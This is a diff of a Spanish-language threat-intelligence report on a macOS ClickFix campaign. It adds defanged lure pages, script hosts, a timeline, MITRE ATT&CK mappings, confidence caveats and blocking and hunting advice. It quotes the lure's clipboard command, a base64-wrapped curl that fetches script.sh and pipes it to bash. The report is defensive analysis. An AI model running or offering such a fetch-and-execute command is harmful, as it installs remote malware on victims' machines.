@@ -5,6 +5,54 @@
 ================================================================================
 
 --------------------------------------------------------------------------------
+ACTUALIZACION 2026-10-08 (2): COMO LLEGA A LA VICTIMA (ENTREGA CLICKFIX)
+--------------------------------------------------------------------------------
+  securecheckv1-proceed[.]pages[.]dev       pagina senuelo 'Secure Gateway';
+                                            baja script.sh de virelianmatrix
+  quicksecurity-checkpointv1[.]pages[.]dev  pagina senuelo 'Secure Gateway';
+                                            baja script.sh de aetherframework
+  virelianmatrix[.]digital                  host del script.sh que pedia el
+                                            senuelo; alta 2026-06-06 10:13:32
+                                            UTC (PDR); resuelve, detras de
+                                            Cloudflare
+  aetherframework[.]digital                 host del script.sh que pedia el
+                                            otro senuelo; alta el MISMO
+                                            segundo; suspendido (clientHold)
+
+Disparador: un hunt publico de ScanMalware.com creado el 2026-10-01 para el
+kit 'Secure Gateway • Quick Verification' (captura 06). Intellroom leyo de la
+API publica de ScanMalware lo que cada pagina copio al portapapeles en 6
+escaneos del 01-10, entre las 09:17 y las 16:26 UTC. Las 6 copian lo mismo:
+
+  bash <<< $(echo "<base64>" | base64 -d)
+  decodificado:  curl -s 'hxxps://<servidor>/script.sh' | bash
+
+La victima cree que pasa una verificacion "no soy un robot", pega eso en la
+Terminal y descarga el cargador. Ninguna pagina ni servidor fue visitado.
+
+El vinculo con ESTE contrato es indirecto. No hay copia del script.sh (ni
+ScanMalware ni urlscan la guardan) y las dos fuentes no son independientes:
+  - ScanMalware afirma que el script de estas paginas instala Phexia, que lee
+    su C2 desde un contrato en Polygon. Pero su hunt cita como referencias el
+    post de fab0 y el blog de Have I Been Squatted, y sus 6 detecciones
+    coinciden solo por el titulo de la pagina, no por el codigo.
+  - Have I Been Squatted (Ben Folland, 2026-07-06) documento en julio otra
+    cadena con el mismo patron de entrega (pagina en Cloudflare Pages, base64
+    a bash, script.sh), con otra pagina y otro servidor, cuyo script hacia
+    eth_call a 0xA3a603F8...7C15C2A0 con el selector 0x2686ecea. Dice que el
+    2026-07-04 el contrato devolvia apdhlhs3[.]xyz: el historial leido de la
+    blockchain tiene ese valor vigente del 06-30 18:23 al 07-09 17:03 UTC
+    (captura 07). Coincide, pero eso prueba que la cadena de julio leia este
+    contrato, no que los hosts de octubre lo hagan.
+Confianza del vinculo entrega-contrato: baja a moderada. Bloquear los 4 hosts
+se justifica igual: las paginas copian un comando que baja un script remoto y
+lo ejecuta con bash.
+
+Evidencia nueva: 06_evidencia_scanmalware_hunt_08102026.png,
+07_evidencia_hibs_contrato_08102026.png y evidencia_entrega_clickfix_08102026.txt.
+Diagramas 01 y 02 regenerados con la etapa de entrega.
+
+--------------------------------------------------------------------------------
 ACTUALIZACION 2026-10-08: INDICADORES NUEVOS (7 C2 del 2026-09-30 al 10-05)
 --------------------------------------------------------------------------------
   sayosay[.]cc          VIGENTE desde 2026-10-05 08:57 UTC; alta 10-04,
@@ -101,6 +149,12 @@ reconstruir la historia completa del contrato.
 2026-05-18 03:00     Primer valor con forma de C2: xuiaxwx[.]com.
 2026-05-27 a 08-12   15 valores mas: 14 dominios con forma de C2 y uno
                      a vigilar (seccion 3 y evidencia_historial_contrato).
+2026-06-06 10:13:32  Se registran virelianmatrix[.]digital y
+                     aetherframework[.]digital, el mismo segundo (PDR).
+2026-07-04           Have I Been Squatted relee el contrato y obtiene
+                     apdhlhs3[.]xyz (coincide con el historial).
+2026-07-06           Have I Been Squatted publica el kit ClickFix que llama
+                     a este contrato.
 2026-08-31 17:11     machine628[.]baby (el primero de la lista de fab0).
 2026-09-07 09:50     d9mjs[.]sbs
 2026-09-18 03:15     namanami[.]top
@@ -111,6 +165,8 @@ reconstruir la historia completa del contrato.
 2026-09-27 21:03     Se registra bagueie[.]xyz (NameSilo).
 2026-09-28 06:15     bagueie[.]xyz se escribe en el contrato. Es el vigente.
 2026-09-28           Verificacion de Intellroom.
+2026-10-01 09:17     Primer escaneo de ScanMalware a una pagina 'Secure
+                     Gateway' (ultimo a las 16:26). Hunt creado a las 12:51.
 
 3. INDICADORES
 --------------------------------------------------------------------------------
@@ -165,8 +221,26 @@ reconstruir la historia completa del contrato.
     0x893d20e8   getOwner()                  devuelve la duena.
     0xf2fde38b   transferOwnership(address)  cambia la duena.
 
+3.3 Entrega ClickFix (defanged). Estado DNS al 2026-10-08.
+
+  securecheckv1-proceed[.]pages[.]dev        senuelo; 3 escaneos del 01-10
+  quicksecurity-checkpointv1[.]pages[.]dev   senuelo; 3 escaneos del 01-10
+      Los dos resuelven a Cloudflare, pero eso no dice si la pagina sigue
+      publicada (no se visito). Bloquear SOLO el subdominio.
+  virelianmatrix[.]digital                   host del script.sh; resuelve
+                                             (Cloudflare). No se comprobo si
+                                             sigue entregando el script.
+  aetherframework[.]digital                  host del script.sh; suspendido por
+                                             el registrador, no resuelve. El
+                                             RDAP no dice desde cuando (ultimo
+                                             cambio: 2026-08-12).
+
 4. LO QUE NO ES UN IOC
 --------------------------------------------------------------------------------
+  pages.dev
+      Dominio de Cloudflare Pages, donde viven millones de sitios legitimos.
+      Se bloquea el subdominio de la pagina senuelo, nunca pages.dev entero.
+
   polygon.drpc.org, polygon.publicnode.com, polygon-mainnet.gateway.tatum.io y
   tenderly.rpc.polygon.community
       Nodos RPC publicos y legitimos de Polygon. El malware los usa, pero
@@ -234,8 +308,21 @@ nodo publico de Polygon):
   T1071.001  Application Layer Protocol: Web Protocols observado (HTTPS a RPC
                                                        y a C2)
   T1583.001  Acquire Infrastructure: Domains           observado (RDAP)
-  T1204.004  User Execution: Malicious Copy and Paste  segun fuentes publicas,
-             (ClickFix)                                no observado aqui
+  T1204.004  User Execution: Malicious Copy and Paste  senuelo visto en
+             (ClickFix)                                escaneos de ScanMalware
+                                                       (01-10); ejecucion por
+                                                       una victima no observada
+  T1027.010  Obfuscated Files or Information:          visto en el comando
+             Command Obfuscation                       copiado (base64)
+  T1140      Deobfuscate/Decode Files or Information   visto en el comando
+                                                       copiado (base64 -d)
+  T1059.004  Command and Scripting Interpreter:        visto en el comando
+             Unix Shell                                copiado (bash); no
+                                                       ejecutado
+  T1105      Ingress Tool Transfer                     visto en el comando
+                                                       copiado (curl de
+                                                       script.sh); descarga no
+                                                       observada
 
 8. QUE NO SE PUDO VERIFICAR Y NO SE AFIRMA
 --------------------------------------------------------------------------------
@@ -256,6 +343,21 @@ nodo publico de Polygon):
     archivo, asi que puede venir de una herramienta o de un tercero. No se usa
     para atribuir.
   - No se envio ninguna peticion HTTP a los dominios C2.
+  - El contenido de los script.sh de virelianmatrix y aetherframework: no hay
+    copia. Que instalen Phexia lo afirma ScanMalware, cuyo hunt cita a fab0 y
+    a Have I Been Squatted y coincide solo por el titulo de la pagina. Have I
+    Been Squatted vio en julio otra cadena con el mismo patron que consultaba
+    este contrato. Posible a probable: confianza baja a moderada.
+  - Que esos dos servidores esten etiquetados como ClearFake (lo dice
+    ScanMalware): abuse.ch exige clave de API y no se comprobo.
+  - Que el kit este activo "desde al menos septiembre" (lo dice ScanMalware):
+    Intellroom solo ve escaneos del 01-10.
+  - escapeai[.]live: ScanMalware lo agrupa en la misma familia de kits y dice
+    que esta etiquetado publicamente como AMOS, otro stealer. No se incluye en
+    este caso.
+  - La infraestructura de julio que lista Have I Been Squatted (otras paginas
+    y un sistema de distribucion de trafico) no se incorpora: no se verifico
+    y parte puede ser de redes de publicidad compartidas.
 
 9. ACCIONES RECOMENDADAS
 --------------------------------------------------------------------------------
@@ -270,6 +372,10 @@ nodo publico de Polygon):
   4. Bloquear tambien los 7 dominios de la ACTUALIZACION 2026-10-08.
   5. Vigilar la wallet 0x363AeAF1...C64AbE3: un contrato nuevo desplegado por
      ella seria el proximo resolvedor.
+  6. Bloquear las 2 paginas senuelo (solo el subdominio, nunca pages.dev) y
+     los 2 servidores de script.sh (seccion 3.3).
+  7. Cazar en macOS: historial de la Terminal o EDR con "base64 -d" encadenado
+     a bash o sh, y curl que baja un script.sh y lo pasa a bash.
   Las ideas de deteccion son hipotesis a validar antes de desplegar
   (redactado con apoyo de IA).
 
@@ -283,6 +389,13 @@ nodo publico de Polygon):
   - Cookie Engineer, "Malware Insights: MacOS Phexia Campaign":
     hxxps://cookie[.]engineer/weblog/articles/malware-insights-macos-phexia-campaign.html
     (ClickFix, /api.php?check y resolucion via Telegram en una variante previa).
+  - ScanMalware.com (Triop AB), hunt 'macOS ClickFix: Secure Gateway • Quick
+    Verification', creado 2026-10-01:
+    hxxps://scanmalware[.]com/hunts/d95af84a-2cdf-4221-9ca1-42622d88b92e
+    y su API publica /api/v1/clipboard/<scan_id> (lo que cada pagina copio).
+  - Ben Folland, Have I Been Squatted, "From typosquatting to macOS backdoor
+    via ClickFix and blockchain C2", 2026-07-06:
+    hxxps://haveibeensquatted[.]com/blog/from-typosquatting-to-macos-backdoor-clickfix-blockchain-c2
   - Metodo propio: eth_getCode y eth_call en polygon-bor-rpc.publicnode.com y
     polygon.drpc.org; codigo fuente verificado e historial de transacciones del
     contrato y de la wallet en la API v2 de polygon.blockscout.com (32 y 35
@@ -309,4 +422,10 @@ nodo publico de Polygon):
   evidencia_historial_contrato_08102026.txt las 7 escrituras nuevas por JSON-RPC,
                                             con las respuestas crudas
   evidencia_dns_rdap_08102026.txt           DNS y RDAP de los 8 dominios recientes
+  06_evidencia_scanmalware_hunt_08102026.png  hunt de ScanMalware (01-10)
+  07_evidencia_hibs_contrato_08102026.png   blog de Have I Been Squatted con
+                                            este contrato (06-07)
+  evidencia_entrega_clickfix_08102026.txt   portapapeles de los 6 escaneos,
+                                            DNS y RDAP de los 4 hosts y cruce
+                                            con el historial, con hora
   evidencia.sha256                          sumas de verificacion
